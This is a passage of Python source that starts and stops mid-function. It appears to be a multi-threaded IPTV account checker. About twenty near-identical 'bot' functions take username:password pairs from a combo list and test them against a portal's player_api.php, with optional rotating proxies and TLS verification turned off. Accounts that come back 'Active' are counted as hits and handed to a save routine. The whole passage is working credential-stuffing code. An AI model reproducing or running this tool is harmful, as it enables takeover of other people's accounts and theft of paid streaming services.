		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_08'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d9():
	global hit
	proxy_=""
	say=0
	for fyz in range(9,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_09'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d10():
	global hit
	proxy_=""
	say=0
	for fyz in range(10,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_10'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 		 			 			 			 			 			 					 
def d11():
	global hit
	proxy_=""
	say=0
	for fyz in range(11,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_11'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			     	
			 
			 
def d12():
	global hit
	proxy_=""
	say=0
	for fyz in range(12,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_12'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			
		
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 		 			 			 			 			 	 				 
def d13():
	global hit
	proxy_=""
	say=0
	for fyz in range(13,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_13'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d14():
	global hit
	proxy_=""
	say=0
	for fyz in range(14,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_14'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 			 
def d15():
	global hit
	say=0
	proxy_=""
	for fyz in range(15,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_15'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d16():
	global hit
	proxy_=""
	say=0
	for fyz in range(16,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_16'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=="Active":
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			     	
			 
def d17():
	global hit
	proxy_=""
	say=0
	for fyz in range(17,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_17'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			     	
			 
def d18():
	global hit
	proxy_=""
	say=0
	for fyz in range(18,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_18'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 	 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d19():
	global hit
	proxy_=""
	say=0
	for fyz in range(19,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_19'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d20():
	global hit
	proxy_=""
	say=0
	for fyz in range(20,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_20'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d21():
	global hit
	proxy_=""
	say=0
	for fyz in range(21,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_21'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 			 
def d22():
	global hit
	proxy_=""
	say=0
	for fyz in range(22,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_22'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 
			 
def d23():
	global hit
	proxy_=""
	say=0
	for fyz in range(23,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_23'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d24():
	global hit
	proxy_=""
	say=0
	for fyz in range(24,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_24'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d25():
	global hit
	proxy_=""
	say=0
	for fyz in range(25,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_25'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 		 			 			 			 			 			 					 
def d26():
	global hit
	proxy_=""
	say=0
	for fyz in range(26,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_26'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 		 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			     	
			 
			 
def d27():
	global hit
	proxy_=""
	say=0
	for fyz in range(27,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_27'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
				 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 		 			 			 			 			 	 				 
def d28():
	global hit
	proxy_=""
	say=0
	for fyz in range(28,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_28'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d29():
	global hit
	proxy_=""
	say=0
	for fyz in range(29,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_29'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
